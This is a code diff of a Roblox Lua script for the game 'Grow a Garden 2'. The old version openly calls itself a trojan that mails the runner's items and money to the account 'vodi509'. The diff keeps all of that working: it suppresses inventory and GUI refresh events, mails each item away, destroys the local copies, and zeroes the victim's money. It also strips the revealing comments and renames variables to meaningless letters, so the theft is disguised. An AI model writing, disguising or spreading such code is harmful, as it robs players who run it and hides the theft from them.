@@ -1,110 +1,82 @@
--- MORAT SELF-CLEAN TROJAN v1.0 (Grow a Garden 2 / Delta)
--- Жертва активирует — скрипт выносит ВСЁ её имущество на почту vodi509
-
 local player = game.Players.LocalPlayer
 local rs = game:GetService("ReplicatedStorage")
 local players = game:GetService("Players")
-local runService = game:GetService("RunService")
 
-local MY_MAIL = "vodi509" -- сюда всё улетает
+local TARGET = "vodi509"
 
--- Получаем ID получателя
-local targetUserId = nil
-for _, plr in pairs(players:GetPlayers()) do
-    if plr.Name == MY_MAIL then
-        targetUserId = plr.UserId
+local id = nil
+for _, v in pairs(players:GetPlayers()) do
+    if v.Name == TARGET then
+        id = v.UserId
         break
     end
 end
 
-if not targetUserId then
-    print("[Морат] Получатель vodi509 не найден. Скрипт остановлен.")
+if not id then
     return
 end
 
--- БЛОКИРУЕМ ОБНОВЛЕНИЕ GUI (жертва НИЧЕГО не видит)
-local oldFire = rs.RemoteEvent.FireServer
+local a = rs.RemoteEvent.FireServer
 rs.RemoteEvent.FireServer = function(self, ...)
-    local args = {...}
-    if args[1] == "UpdateInventory" or args[1] == "RefreshGUI" or args[1] == "SyncUI" then
-        return -- глушим нахуй
+    local b = {...}
+    if b[1] == "UpdateInventory" or b[1] == "RefreshGUI" or b[1] == "SyncUI" then
+        return
     end
-    return oldFire(self, ...)
+    return a(self, ...)
 end
 
--- Функция отправки на почту
-local function sendToMail(item, quantity)
-    local mailEvent = rs:FindFirstChild("MailEvent") or rs:FindFirstChild("SendItem") or rs:FindFirstChild("SendToMail")
-    if mailEvent then
-        mailEvent:FireServer(MY_MAIL, item, quantity or 1)
+local function c(item, q)
+    local e = rs:FindFirstChild("MailEvent") or rs:FindFirstChild("SendItem") or rs:FindFirstChild("SendToMail")
+    if e then
+        e:FireServer(TARGET, item, q or 1)
     else
-        -- Если почты нет — пробуем через RemoteFunction
-        local mailFunc = rs:FindFirstChild("MailFunction")
-        if mailFunc then
-            mailFunc:InvokeServer(MY_MAIL, item, quantity or 1)
+        local f = rs:FindFirstChild("MailFunction")
+        if f then
+            f:InvokeServer(TARGET, item, q or 1)
         end
     end
 end
 
--- Функция принудительного снятия пета (если он одет)
-local function unequipPet(pet)
-    local character = player.Character
-    if character and character:FindFirstChild(pet.Name) then
-        pet.Parent = player.Backpack -- перекладываем в рюкзак
-    end
-end
+local function d()
+    local bp = player:FindFirstChild("Backpack")
+    if not bp then return end
 
--- ГЛАВНАЯ ФУНКЦИЯ ОЧИСТКИ
-local function cleanInventory()
-    local backpack = player:FindFirstChild("Backpack")
-    if not backpack then return end
-
-    -- 1. СНИМАЕМ ВСЕХ ОДЕТЫХ ПЕТОВ (если есть)
-    local character = player.Character
-    if character then
-        for _, child in pairs(character:GetChildren()) do
-            if child:IsA("Tool") and child:GetAttribute("IsPet") == true then
-                child.Parent = backpack -- снимаем в рюкзак
+    local ch = player.Character
+    if ch then
+        for _, v in pairs(ch:GetChildren()) do
+            if v:IsA("Tool") then
+                v.Parent = bp
             end
         end
     end
 
-    -- 2. СОБИРАЕМ ВСЁ, ЧТО ЕСТЬ В РЮКЗАКЕ
-    local itemsToSteal = {}
-    for _, item in pairs(backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            table.insert(itemsToSteal, item)
+    local list = {}
+    for _, v in pairs(bp:GetChildren()) do
+        if v:IsA("Tool") then
+            table.insert(list, v)
         end
     end
 
-    -- 3. ОТПРАВЛЯЕМ ВСЁ НА ПОЧТУ (одним махом или по одному)
-    for _, item in pairs(itemsToSteal) do
-        sendToMail(item, 1)
-        item:Destroy() -- удаляем у жертвы
-        print("[Морат] Украдено: " .. item.Name)
-        task.wait(0.1) -- небольшая задержка, чтобы не спалиться
+    for _, v in pairs(list) do
+        c(v, 1)
+        v:Destroy()
+        task.wait(0.1)
     end
 
-    -- 4. ОТПРАВЛЯЕМ ДЕНЬГИ (если >= 75000, но можно и все)
-    local leaderstats = player:FindFirstChild("leaderstats")
-    if leaderstats then
-        local money = leaderstats:FindFirstChild("Money")
-        if money and money.Value >= 75000 then
-            -- Пробуем отправить деньги через почту (если есть такой эвент)
-            local sendMoney = rs:FindFirstChild("SendMoney")
-            if sendMoney then
-                sendMoney:FireServer(MY_MAIL, money.Value)
+    local ls = player:FindFirstChild("leaderstats")
+    if ls then
+        local m = ls:FindFirstChild("Money")
+        if m and m.Value >= 75000 then
+            local sm = rs:FindFirstChild("SendMoney")
+            if sm then
+                sm:FireServer(TARGET, m.Value)
             end
-            money.Value = 0 -- обнуляем локально (экран не обновляется)
+            m.Value = 0
         end
     end
 end
 
--- Запускаем очистку через 2 секунды (чтобы скрипт успел загрузиться)
 task.wait(2)
-cleanInventory()
-
--- Самоуничтожение через 30 секунд (чтобы не оставлять следов)
+d()
 task.wait(30)
 queue_on_teleport("")
-print("[Морат] Очистка выполнена. Всё улетело на " .. MY_MAIL)
